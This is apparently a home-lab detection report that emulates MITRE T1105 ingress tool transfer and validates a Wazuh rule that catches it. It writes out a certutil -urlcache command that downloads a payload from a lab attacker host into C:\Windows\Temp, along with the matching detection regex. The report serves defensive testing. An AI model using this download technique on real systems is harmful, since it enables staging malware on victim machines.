# Adversary Emulation & Detection Report: Ingress Tool Transfer via LOLBin (T1105)

## Case Details
- **Tactic:** Command and Control (TA0011)
- **Technique:** Ingress Tool Transfer (T1105)
- **Target Host:** Windows 10 Pro (`192.168.56.20` - `DESKTOP-0MKICAR`)
- **Telemetry Enriched:** Sysmon Process Creation (Event ID 1) / Security Event ID 4688
- **Detection Rule:** Wazuh Custom Rule `100050` (Level 12)

## Execution Command (Adversary Node)
Served payload via simple Python HTTP server on Kali Linux (`192.168.56.10`).

## Execution Command (Victim Node Emulation)
```cmd
certutil.exe -urlcache -split -f http://192.168.56.10/payload.txt C:\Windows\Temp\payload.txt
```

## Telemetry & Forensic Validation
- **Disk Artifact:** Identified malicious payload saved to `C:\Windows\Temp\payload.txt` (1 KB).
- **Rule Trigger:** Wazuh rule `100050` fired successfully by matching `(?i)certutil.*-urlcache` against `win.eventdata.commandLine`.
- **False Positive Tuning:** Acknowledged benign OS noise from `taskschd.dll`, documented for filtering in upcoming persistence rules (T1053.005).

## Proof of Detection
Refer to evidence artifacts in `docs/images/`:
- **Execution:** `01-certutil-execution-cmd.png`
- **Forensic Artifact:** `02-payload-artifact-temp.png`
- **SIEM Alert:** `03-wazuh-detection-t1105.png`
